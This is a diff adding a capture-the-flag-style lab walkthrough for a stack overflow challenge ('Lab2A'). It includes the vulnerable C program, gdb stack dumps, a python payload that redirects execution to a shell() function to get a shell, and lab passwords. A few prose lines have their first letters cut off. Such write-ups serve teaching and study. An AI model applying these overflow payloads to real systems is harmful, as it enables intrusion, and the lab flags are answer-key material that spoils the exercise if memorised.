@@ -388,6 +388,161 @@ $
 i_c4ll_wh4t_i_w4nt_n00b
 ```
 
+## Lab2A
+
+### Recon
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/*
+ * compiled with:
+ * gcc -O0 -fno-stack-protector lab2A.c -o lab2A
+ */
+
+void shell()
+{
+        printf("You got it\n");
+        system("/bin/sh");
+}
+
+void concatenate_first_chars()
+{
+        struct {
+                char word_buf[12];
+                int i;
+                char* cat_pointer;
+                char cat_buf[10];
+        } locals;
+        locals.cat_pointer = locals.cat_buf;
+
+        printf("Input 10 words:\n");
+        for(locals.i=0; locals.i!=10; locals.i++)
+        {
+// Read from stdin
+                if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
+                {
+                        printf("Failed to read word\n");
+                        return;
+                }
+                // Copy first char from word to next location in concatenated buffer
+                *locals.cat_pointer = *locals.word_buf;
+                locals.cat_pointer++;
+        }
+
+        // Even if something goes wrong, there's a null byte here
+        //   preventing buffer overflows
+        locals.cat_buf[10] = '\0';
+        printf("Here are the first characters from the 10 words concatenated:\n\
+%s\n", locals.cat_buf);
+}
+
+int main(int argc, char** argv)
+{
+        if(argc != 1)
+        {
+                printf("usage:\n%s\n", argv[0]);
+                return EXIT_FAILURE;
+        }
+
+        concatenate_first_chars();
+
+        printf("Not authenticated\n");
+        return EXIT_SUCCESS;
+}
+```
+
+s we can see, the main function calls a function that calls a function that creates a struct, reads 10 words in, aand prints out first letter of each word.
+irst thing to note is, that index variable i is vuln to bein' overflowed, and because loop merely checks i does not equal ten, it can be overflown as we want. This will give us the chance to read in as many bytes as we want, leading to further overflows.
+
+he buffer ```word_buf``` in struct ```locals``` just has capacity for 12 characters and due to alignment on stack, the counter ```i``` should be located at offset 12 in struct. So if we input more than 12 bytes in ```concatenate_first_chars()``` when ```fgets()``` gets called, we should be able to overwrite ```i```. This is the stack just after prologue in ```concatenate_first_chars()``` has been called:
+
+```
+gdb-peda$ x/32xw $esp
+0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0xb7e56273
+0xbffff670:     0x00000000      0x00c30000      0x00000001      0x0804856d
+0xbffff680:     0xbffff88f      0x0000002f      0x0804a000      0x08048852
+0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
+0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
+0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
+0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
+0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
+```
+And here's the stack layout after a word (here just consisting of one A and a trailing newline) has been entered:
+
+```
+gdb-peda$ x/32xw $esp
+0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
+0xbffff670:     0x00000a41      0x00c30000      0x00000001      0x00000000    <= 0xbffff670 is loc of input buffer
+0xbffff680:     0xbffff684      0x0000002f      0x0804a000      0x08048852
+0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
+0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
+0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
+0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
+0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
+```
+
+We have inputted 12 A's and value at 0xbffff67c is is value of '\n' after it has been incremented (i++):
+
+```
+gdb-peda$ x/32xw $esp
+0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
+0xbffff670:     0x41414141      0x41414141      0x41414141      0x0000000b
+0xbffff680:     0xbffff685      0x00000041      0x0804a000      0x08048852
+0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
+0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
+0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
+0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
+0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
+```
+So our payload consists of 12 A's + "\n", where 13th byte overwrites i.
+At 0xbffff680 there's the location where each character is stored. It must be overflown to overwrite return address of function, which is at 0xbffff69c:
+
+```
+gdb-peda$ i frame 0
+Stack frame at 0xbffff6a0:
+ eip = 0x8048795 in concatenate_first_chars; saved eip = 0x80487e6
+ called by frame at 0xbffff6c0
+ Arglist at 0xbffff698, args:
+ Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
+ Saved registers:
+  ebp at 0xbffff698, eip at 0xbffff69c
+```
+So after writing 24 more bytes (including the first overflow byte) we should be able to overwrite RIP.
+
+```
+$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xef\n"+"\xbe\n"+"\xad\n"+"\xde\n"' > /tmp/pattern2.txt
+[...]
+gdb-peda$ r < <(cat /tmp/pattern2.txt) 
+Stopped reason: SIGSEGV
+0xdeadbeef in ?? ()
+```
+
+Now we have to find the address of ```shell()``` function we want to return to:
+
+```
+gdb-peda$ p shell
+$1 = {<text variable, no debug info>} 0x80486fd <shell>
+[...]
+$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xfd\n"+"\x86\n"+"\x04\n"+"\x08\n"' > /tmp/pattern2.txt
+$ (cat /tmp/pattern2.txt; cat -) | ./lab2A
+Input 10 words:
+Failed to read word
+You got it
+ls
+lab2A  lab2A.c  lab2B  lab2B.c  lab2C  lab2C.c
+```
+
+The ```cat - ``` command is for leaving stdin open.
+
+### Pass Lab2end
+
+```
+D1d_y0u_enj0y_y0ur_cats?
+```
+
 ### Pass Lab3C
 ```
 th3r3_iz_n0_4dm1ns_0n1y_U!
